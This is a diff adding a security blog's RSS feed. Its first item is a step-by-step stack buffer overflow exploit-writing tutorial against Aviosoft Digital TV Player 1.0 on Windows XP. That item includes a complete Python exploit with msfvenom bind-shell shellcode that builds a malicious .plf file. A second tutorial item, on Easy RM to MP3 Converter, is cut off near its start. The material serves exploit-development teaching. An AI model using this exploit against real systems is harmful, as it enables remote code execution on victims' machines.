@@ -1,0 +1,479 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Seh on camelinc</title>
+    <link>http://camelinc.info/tags/seh/</link>
+    <description>Recent content in Seh on camelinc</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 26 May 2014 13:05:09 +0000</lastBuildDate>
+    <atom:link href="http://camelinc.info/tags/seh/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow</title>
+      <link>http://camelinc.info/blog/2014/05/Aviosoft-Digital-TV-Player-Professional-1.0-Stack-Buffer-Overflow/</link>
+      <pubDate>Mon, 26 May 2014 13:05:09 +0000</pubDate>
+      
+      <guid>http://camelinc.info/blog/2014/05/Aviosoft-Digital-TV-Player-Professional-1.0-Stack-Buffer-Overflow/</guid>
+      <description>
+
+&lt;h1 id=&#34;prequisites:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;Prequisites&lt;/h1&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Windows XP SP3 (en-us)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.immunityinc.com/products-immdbg.shtml&#34;&gt;Immunity Debugger&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/wp-content/themes/exploit/applications/55740fe6c4e56674125a1968a139ed36-AviosoftDTVPlayerPro.exe&#34;&gt;AviosoftDTVPlayerPro&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&#34;triggering-the-overflow:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;Triggering the overflow&lt;/h1&gt;
+
+&lt;p&gt;After some fuzzing the basic exploit can be create with the following python code.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;lineno&#34;&gt;1 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#!/usr/bin/python -w&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;2 &lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;3 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2000&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;4 &lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;5 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;evil.plf&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;6 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;7 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Opening this file with the vulnerable application results in an access violation with the following register values.&lt;/p&gt;
+
+
+
+&lt;figure &gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/initial_crash.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Register values at the access violation. EIP was overwritten with AAAA.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/initial_crash.png&#34; alt=&#34;Register values at the access violation. EIP was overwritten with AAAA.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Great, the EIP is under our control.&lt;/p&gt;
+
+&lt;h1 id=&#34;identifying-eip-offset:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;Identifying EIP Offset&lt;/h1&gt;
+
+&lt;p&gt;In order to identify the correct offset of the overflow let&amp;rsquo;s create a pattern and start again.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona pc 2000&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Mona.py creates a unique pattern that has to be opened by the application.
+At the time of the access violation the following register values are presented.&lt;/p&gt;
+
+
+
+&lt;figure &gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/find_pattern.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Identifying the offset of EIP&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/find_pattern.png&#34; alt=&#34;Identifying the offset of EIP&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;Again, mona.py can help us to identify the correct offset of the overflow.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona findmsp&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This command does all the magic.
+The output is depicted in the following screenshot.&lt;/p&gt;
+
+
+
+&lt;figure &gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/findmsp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Offset for EIP is 1109&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/findmsp.png&#34; alt=&#34;Offset for EIP is 1109&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;We can also check the offset manually.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona pattern_offset 37694136&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt; - Pattern 6Ai7 (0x37694136) found in cyclic pattern at position 260&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now we know, that we can overwrite the EIP after 260 bytes.
+After updating the initial script, we can now exactly overwrite EIP.&lt;/p&gt;
+
+&lt;p&gt;
+
+&lt;figure &gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/overwrite_eip.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Overwriting EIP with BBBB&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/overwrite_eip.png&#34; alt=&#34;Overwriting EIP with BBBB&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+&lt;/p&gt;
+
+&lt;h1 id=&#34;controlling-eip:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;Controlling EIP&lt;/h1&gt;
+
+&lt;p&gt;Luckily, ESP points to the bytes after the BBBB.
+So let&amp;rsquo;s identify a location that stores a suiteable JMP ESP.&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona jmp -r esp&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Mona.py can list all suitable JMP instructions.&lt;/p&gt;
+
+&lt;p&gt;
+
+&lt;figure &gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/jmp_esp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;JMP ESP instructions available in process memory.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/jmp_esp.png&#34; alt=&#34;JMP ESP instructions available in process memory.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s choose one after identifying the bad characters.&lt;/p&gt;
+
+&lt;h1 id=&#34;identifying-bad-characters:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;Identifying Bad Characters&lt;/h1&gt;
+
+&lt;p&gt;Next, we need to verify the valid charset for the exploit.
+Let&amp;rsquo;s create a byte pattern and compare it against loaded data.&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona bytearray -b &amp;#39;\x00&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;The bad characters \x0A was identified at 0x0012f489.&lt;/p&gt;
+
+&lt;p&gt;
+
+&lt;figure &gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/bad_chars.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The pattern stops at offset 0x0012f489, which indicates a bad character.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/bad_chars.png&#34; alt=&#34;The pattern stops at offset 0x0012f489, which indicates a bad character.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+&lt;/p&gt;
+
+&lt;p&gt;Iterating the previous steps until finally, all bad characters have been identified.&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona compare -f c:\logs\DVDXPlayer\bytearray.bin&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;[+] Comparing with memory at location : 0x0012f480 (Stack)&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;!!! Hooray, normal shellcode unmodified !!!&lt;/span&gt;
+&lt;span class=&#34;go&#34;&gt;Bytes omitted from input: 00 0a 1a&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;h1 id=&#34;adding-shellcode:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;Adding Shellcode&lt;/h1&gt;
+
+&lt;p&gt;Finally, let&amp;rsquo;s add a custom payload to the exploit code.
+With metasploit, we can just do that and update the python PoC.&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b &amp;#39;\x00\x0a\x1a&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;h1 id=&#34;the-exploit:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;The Exploit&lt;/h1&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;lineno&#34;&gt; 1 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#!/usr/bin/python -w&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 2 &lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 3 &lt;/span&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;struct&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 4 &lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 5 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#-------------------------------------------------------------------------------------------------------#&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 6 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b &amp;#39;\x00\x0a\x1a&amp;#39; #&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 7 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#-------------------------------------------------------------------------------------------------------#&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 8 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xbf\x11\xa0\x1c\x7c\xd9\xe9\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 9 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x56\x83\xea\xfc\x31\x7a\x0f\x03\x7a\x1e\x42\xe9\x80\xc8\x0b&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;10 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x12\x79\x08\x6c\x9a\x9c\x39\xbe\xf8\xd5\x6b\x0e\x8a\xb8\x87&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;11 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xe5\xde\x28\x1c\x8b\xf6\x5f\x95\x26\x21\x51\x26\x87\xed\x3d&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;12 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xe4\x89\x91\x3f\x38\x6a\xab\x8f\x4d\x6b\xec\xf2\xbd\x39\xa5&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;13 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x79\x6f\xae\xc2\x3c\xb3\xcf\x04\x4b\x8b\xb7\x21\x8c\x7f\x02&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;14 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2b\xdd\x2f\x19\x63\xc5\x44\x45\x54\xf4\x89\x95\xa8\xbf\xa6&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;15 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x6e\x5a\x3e\x6e\xbf\xa3\x70\x4e\x6c\x9a\xbc\x43\x6c\xda\x7b&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;16 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xbb\x1b\x10\x78\x46\x1c\xe3\x02\x9c\xa9\xf6\xa5\x57\x09\xd3&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;17 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x54\xb4\xcc\x90\x5b\x71\x9a\xff\x7f\x84\x4f\x74\x7b\x0d\x6e&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;18 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x5b\x0d\x55\x55\x7f\x55\x0e\xf4\x26\x33\xe1\x09\x38\x9b\x5e&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;19 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xac\x32\x0e\x8b\xd6\x18\x47\x78\xe5\xa2\x97\x16\x7e\xd0\xa5&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;20 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xb9\xd4\x7e\x86\x32\xf3\x79\xe9\x69\x43\x15\x14\x91\xb4\x3f&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;21 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xd3\xc5\xe4\x57\xf2\x65\x6f\xa8\xfb\xb0\x20\xf8\x53\x6a\x81&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;22 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xa8\x13\xda\x69\xa3\x9b\x05\x89\xcc\x71\x30\x8d\x02\xa1\x11&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;23 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x7a\x67\x55\x84\x26\xee\xb3\xcc\xc6\xa6\x6c\x78\x25\x9d\xa4&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;24 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x1f\x56\xf7\x98\x88\xc0\x4f\xf7\x0e\xee\x4f\xdd\x3d\x43\xe7&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;25 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xb6\xb5\x8f\x3c\xa6\xca\x85\x14\xa1\xf3\x4e\xee\xdf\xb6\xef&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;26 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xef\xf5\x20\x93\x62\x92\xb0\xda\x9e\x0d\xe7\x8b\x51\x44\x6d&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;27 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x26\xcb\xfe\x93\xbb\x8d\x39\x17\x60\x6e\xc7\x96\xe5\xca\xe3&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;28 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x88\x33\xd2\xaf\xfc\xeb\x85\x79\xaa\x4d\x7c\xc8\x04\x04\xd3&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;29 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x82\xc0\xd1\x1f\x15\x96\xdd\x75\xe3\x76\x6f\x20\xb2\x89\x40&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;30 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xa4\x32\xf2\xbc\x54\xbc\x29\x05\x64\xf7\x73\x2c\xed\x5e\xe6&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;31 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x6c\x70\x61\xdd\xb3\x8d\xe2\xd7\x4b\x6a\xfa\x92\x4e\x36\xbc&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;32 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x4f\x23\x27\x29\x6f\x90\x48\x78&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;33 &lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;34 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;260&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;35 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;&amp;lt; L&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x6405c20b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;#jmp esp [MediaPlayerCtrl.dll]&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;36 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x90&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;37 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;38 &lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;39 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;evil.plf&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;40 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;41 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;By loading the plf file, the payload is executed.&lt;/p&gt;
+
+&lt;p&gt;
+
+&lt;figure &gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2014/dvdxplayer/bind_shell.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Local listening services before and after bind shell is started by opening the custom plf file&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2014/dvdxplayer/bind_shell.png&#34; alt=&#34;Local listening services before and after bind shell is started by opening the custom plf file&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+&lt;/p&gt;
+
+&lt;h1 id=&#34;links-and-references:dc6c0547b941be7f8dbf8bb054d9be75&#34;&gt;Links and References&lt;/h1&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/exploits/18109/&#34;&gt;EDB-ID: 18109&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/exploits/22932/&#34;&gt;EDB-ID: 22932&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/&#34;&gt;Exploit writing tutorial part 1 : Stack Based Overflows&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Easy RM to MP3 Converter</title>
+      <link>http://camelinc.info/blog/2014/05/Easy-RM-to-MP3-Converter/</link>
+      <pubDate>Sun, 25 May 2014 11:27:27 +0000</pubDate>
+      
+      <guid>http://camelinc.info/blog/2014/05/Easy-RM-to-MP3-Converter/</guid>
+      <description>
+
+&lt;h1 id=&#34;prequisites:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;Prequisites&lt;/h1&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Windows XP SP3 (en-us)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.immunityinc.com/products-immdbg.shtml&#34;&gt;Immunity Debugger&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/wp-content/themes/exploit/applications/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe&#34;&gt;Easy RM to MP3 Converter&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&#34;identifying-the-vulnerability:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;Identifying the Vulnerability&lt;/h1&gt;
+
+&lt;p&gt;First of all we need to identify the appropriate buffer size for the exploit.
+To do this, we  simply execute the following python script.&lt;/p&gt;
+
